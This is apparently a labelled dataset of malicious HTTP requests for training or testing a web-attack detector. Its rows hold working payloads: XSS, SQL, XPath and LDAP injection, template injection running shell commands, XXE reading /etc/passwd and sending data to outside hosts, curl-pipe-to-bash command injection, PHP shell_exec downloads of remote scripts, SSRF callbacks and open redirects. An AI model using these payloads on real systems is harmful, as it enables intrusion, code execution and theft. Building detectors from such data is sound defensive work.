"text","label"
"POST /api/metadata/update HTTP/1.1
Host: secure-content-upload.biz
Content-Type: application/json
Content-Length: 359
Origin: https://dashboard.secure-content-upload.biz
X-Requested-With: FetchAPIClient
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Mobile Safari/537.36
Accept: application/json
Accept-Language: en-GB,en;q=0.8
Accept-Encoding: gzip, deflate, br

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""update-v3"",
  ""meta_version"": ""v3.1.8"",
  ""author"": ""clara.smith"",
  ""valid_until"": ""2025-01-01T00:00:00Z""
}","malicious"
"GET /members/<ImG SrC=x oNeRrOr=prompt(123)>/profile HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US
Referer: https://community.game-dev-forum.org/latest
Connection: close","malicious"
"PATCH /api/v2/accounts/update-profile HTTP/1.1
Host: secure-cloud-portal.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2N0IjoiMTIzNDU2IiwiZXhwIjoxNjgyODU0ODAwfQ.SFlKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7

{
  ""user_details"": {
    ""name"": ""attacker"",
    ""phone"": ""+1-555-0199"",
    ""contact"": {
      ""email"": ""hacker@secure-cloud-portal.ai"",
      ""address"": ""123 Malicious Rd""
    }
  },
  ""account_info"": {
    ""subscription_level"": ""premium"",
    ""override_settings"": {
      ""is_feature_xyz_enabled"": true,
      ""credits_override"": 99999
    }
  }
}","malicious"
"POST /service/xml/upload HTTP/1.1
Host: cloud-storage-data-services.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/xml
Accept: application/xml, text/xml
Accept-Language: en-US,en;q=0.7
Content-Length: 290

<!DOCTYPE upload [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % dtd SYSTEM ""http://data-exfil.api.cloud-data-services.ai/oob.dtd"">
%dtd;
%send;
]>
<upload><doc>info</doc></upload>","malicious"
"GET /reports/stats HTTP/1.1
Host: portal.smart-office-solutions.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Debug-Data: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnc2VjdXJlIGRhdGEgc2VydmVyJyk8L3NjcmlwdD4=""></iframe>
Referer: https://portal.smart-office-solutions.org/dashboard
Cookie: sid=OGY5MmQ4NzMyNmMxMzA1N2Y0YWYwZmI2NA==","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/json
Accept: application/json
X-Debug-Mode: enabled
Content-Length: 32

{""search"":""laptop"",""page"":1}","malicious"
"PUT /api/users/55555/settings HTTP/1.1
Host: enterprise-fintech-solutions.tech
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjE2In0.eyJpc3MiOiJmb250ZWNoIiwic3ViIjoiNTU1NTUiLCJpYXQiOjE2ODc1MTEyMDB9.oPPpjnpHxCtf8hUa-xHqkRxQHUztqhfvCqP0XQ9DkyZ5muA8tjVz70rSZ6xeTdHY6Xm-C4i2e3he7_sQkG89GzIJAgHcRiJL6EjAcUQD0oK9xX8OiMslrxMb-M6SiX8FiVV0Z6Xnq-JfG5DtxB51N_DY2Me-Xn34VQWMLhNA6cQ
Content-Type: application/json
Accept: application/json
Content-Length: 238

{
  ""profile_info"": {
    ""user_tag"": ""vipclient"",
    ""contact_email"": ""client55555@fintechpro.tech""
  },
  ""account_modifiers"": {
    ""plan_level"": ""gold"",
    ""admin_flags"": {
      ""can_edit_sensitive"": true,
      ""credit_limit_override"": 150000
    }
  }
}","malicious"
"POST /profile/update HTTP/1.1
Host: member-portal-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://member-portal-secure.net/profile/edit
Content-Length: 203

settings_data_b64=TzozMToiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VwZEhhbmRsZXIiOjQ6e3M6NToicmVjbG9zZSI7YjoxO3M6NToicG9ydCI7aToxMjM0O3M6NTA6InN5c3RlbS9sb2NhbGhvc3QiO31=","malicious"
"GET /profile/view?user=user123%0d%0aSet-Cookie:%20lang=en-US; Expires=Wed, 09 Jun 2030 10:18:14 GMT HTTP/1.1
Host: social-connect.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Connection: close","malicious"
"GET /fetch/%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('ps%20aux').read()%7D%7D/data HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Wget/1.21.1
Accept: */*
Accept-Encoding: identity
Connection: close","malicious"
"GET /search HTTP/1.1
Host: tech-news-daily.news
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
X-Inject-Here: <!--#exec cmd=""ls -la /tmp"" -->
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
X-Requested-With: XMLHttpRequest","malicious"
"PUT /user/profile/submit HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Accept-Language: en-GB,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Sec-CH-UA: ""Chromium"";v=""92"", "" Not A;Brand"";v=""99"", ""Google Chrome"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""macOS""
Origin: https://secure-user-portal.net
Cache-Control: max-age=0

{
  ""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""
}","malicious"
"POST /user/settings HTTP/1.1
Host: api.cloud-data-services.ai
X-Forwarded-For: 192.168.1.45%0d%0aX-Injected-Header:%20InjectedData
Content-Type: application/json
User-Agent: curl/7.77.0
Accept: */*
Content-Length: 27

{""email"":""user@domain.com""}","malicious"
"PATCH /api/account/update HTTP/1.1
Host: member-area.cloud-digitalnet.ai
Content-Type: application/json
X-CSRF-Token: 7b8c32c41d094832b27ae7842f42dfa1
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Origin: https://member-area.cloud-digitalnet.ai
Referer: https://member-area.cloud-digitalnet.ai/profile/edit
Pragma: no-cache

{
  ""email"": ""amelia.rose@cloud-digitalnet.ai"",
  ""username"": ""amel.rose"",
  ""is_admin"": true,
  ""subscription_level"": ""gold""
}","malicious"
"GET /user/preferences?nickname=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: event-management-suite.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Connection: keep-alive","malicious"
"POST /service/xml/receive HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Content-Type: application/xml
Content-Length: 306
Connection: close

<!DOCTYPE msg [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % dtd SYSTEM ""http://api-malware-data.net/send.dtd"">
%dtd;
%send;
]>
<message><payload>&exfil;</payload></message>","malicious"
"GET /api/v1/account/status HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive","malicious"
"GET /fetch/config?env=prod HTTP/1.1
Host: secure-auth-service.online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: application/json
X-Callback-Server: http://bindtimeout-service.control-panel.tech/notify
Referer: https://secure-auth-service.online-retail-store.biz/login
Connection: close","malicious"
"POST /user/profile/edit HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 90
Connection: close

name=John+Doe&role=user&name=John+Doe%3B+admin&role=admin&email=john%40doe.com","malicious"
"GET /portal/index?welcome=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: dev-ops-toolkit.cloud
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Connection: close","malicious"
"GET /xml_api/search_books?genre=fiction%27%20or%20starts-with(author%2Fname%2Cl%27A%27)%20or%20%271%27%3D%271 HTTP/1.1
Host: bookmarket-digital.io
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Connection: close","malicious"
"GET /account/settings?email=user%40mail.com&%65%6D%61%69%6C=user%40mail.com%27%20OR%201=1-- HTTP/1.1
Host: online-marketing-solutions.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Pragma: no-cache
Connection: close","malicious"
"POST /user/session HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://online-retail-store.biz/login
Origin: https://online-retail-store.biz
Connection: keep-alive

login=customer' and substring(concat(//accounts/account[1]/password),2,1)='s'&pass=irrelevant","malicious"
"POST /upload/image HTTP/1.1
Host: media-content-host.online-retail-store.biz
User-Agent: Wget/1.21.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Notification-Endpoint: http://rebind-callback-ssrf.attacker-domain.org/upload
Content-Length: 27

imageName=summer_vacation.jpg&tag=beach","malicious"
"POST /api/v2/form/submit-signature HTTP/1.1
Host: api.cloud-verification.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
X-Requested-With: XMLHttpRequest
Connection: keep-alive

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ","malicious"
"GET /search?q=%26lt%3Bscript%26gt;alert%28%27XSS_%20Vulnerability_Found%27%29%26lt%3B%2fscript%26gt; HTTP/1.1
Host: tech-news-portal.ai
Connection: close
Accept: text/html
Accept-Language: en-US,en;q=0.9
Referer: https://tech-news-portal.ai/trending
User-Agent: curl/7.77.0","malicious"
"POST /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 113
Connection: close

notes=Persistent+and+user-friendly.%20<?php%20echo%20shell_exec%28%27wget%20http%3A%2F%2Fspy-net-ocean.net%2Fhack.php%20-O%20%2Ftmp%2Fexploit.php%27%29%3B%20%3F%3E","malicious"
"GET /blog/article/view?id=321&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://my-personal-blog-site.info/articles
Cache-Control: max-age=0
Connection: close","malicious"
"GET /login?redirect_url=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/shopping/cart
Accept-Language: en-US,en;q=0.7
Connection: keep-alive","malicious"
"POST /api/v1/actions/run HTTP/1.1
Host: smart-home-control.iotnet.xyz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/json
Content-Length: 111

{""action"":""restart"",""target"":""192.168.100.5 && curl http://dangerous-exec.taskserve.cloud/inject.sh|bash"",""delay"":10}","malicious"
"POST /app/userinfo HTTP/1.1
Host: enterprise-hub-login.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.9
Content-Length: 56

user_id=validuser%29%28objectClass%3D*%29&attributes=%2A","malicious"
"POST /user/search HTTP/1.1
Host: member.login.community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Charset: utf-8, iso-8859-1;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 58

user_id=validuser%29%28objectClass%3D*%29&attributes=%2A","malicious"
"POST /api/xml/processOrder HTTP/1.1
Host: data-ingest.cloud-secure-portal.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/xml, text/xml, */*
Content-Type: application/xml
Content-Length: 234
Connection: close

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE order [
<!ELEMENT order ANY >
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
<order>
  <orderId>&xxe;</orderId>
  <note>Regular order processing</note>
</order>","malicious"
"POST /auth HTTP/1.1
Host: portal.finance-services.co
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Content-Length: 78
Connection: keep-alive
Cookie: sess=7d9c4b1e3f2a5d6e8c0b9a7f4d3e2c1b

user=client' and substring(//clients/client[1]/creditcard,5,1)='5&pass=hidden","malicious"
"HEAD /sessions/current HTTP/1.1
Host: auth-secure-hub.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Referer: https://auth-secure-hub.org/login{#{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}#}
Accept: */*
Connection: close","malicious"
"GET /logout?next=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Referer: https://community.game-dev-forum.org/profile
Connection: close","malicious"
"PUT /api/profile/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Content-Length: 335
Origin: https://community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
X-Requested-With: FetchAPIClient
Accept: application/json, text/html
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""deepXSSKey"",
  ""preferences"": {
    ""language"": ""fr"",
    ""notificationsEnabled"": true,
    ""layout"": ""compact""
  },
  ""lastLogin"": ""2024-06-22T16:53:19Z"",
  ""sessionId"": ""c89214e7-fd9e-4ae6-a6f6-5bf5c3cdc7b5""
}","malicious"
"GET /xml_api/search_books?book_title=The+Greatest%27%20or%20%271%27%3D%271 HTTP/1.1
Host: reading-haven-library.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive","malicious"
"GET /orders/9001' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x23,(SELECT @@version),0x23,FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a) -- HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Referer: https://online-retail-store.biz/cart","malicious"
"GET /articles/search?search_term=42%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: breakingnews.daily-chronicles.net
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.5
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.UZy1SYPj6D3b4EkhdoZr8vFQxPfMWT8BtzXw","malicious"
"POST /app/user/settings HTTP/1.1
Host: trendy-fashionshop.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Cookie: session=28fac71588e9d225734d3deb20a6bc72; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)/*!MySQLComment*/-- -; layout=grid

email=validuser%40mail.com&theme=dark","malicious"
"GET /api/v2/user/refresh-token HTTP/1.1
Host: auth.gateway-connection.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/plain, */*
X-Data-Source: http://taskqueue.rebound-service.net/trigger
Cache-Control: no-cache","malicious"
"POST /submit HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
User-Agent: curl/7.77.0
Accept: */*
Content-Length: 108
Connection: close

name=admin&comment=Nice+platform%21+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fcmd-exec-cloud.dev%2Fhack.php+-O+%2Ftmp%2Fcmd.php%27%29%3B+%3F%3E","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8

query=test&filter=none&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41))%3C%2Fscript%3E","malicious"
"POST /admin/moderate_comment HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15

comment_ref=123&action_param_b64=cHJvZHVjdF9pZD0xMjM7IERST1AgVEFCTEUgdXNlcnM7IC0t","malicious"
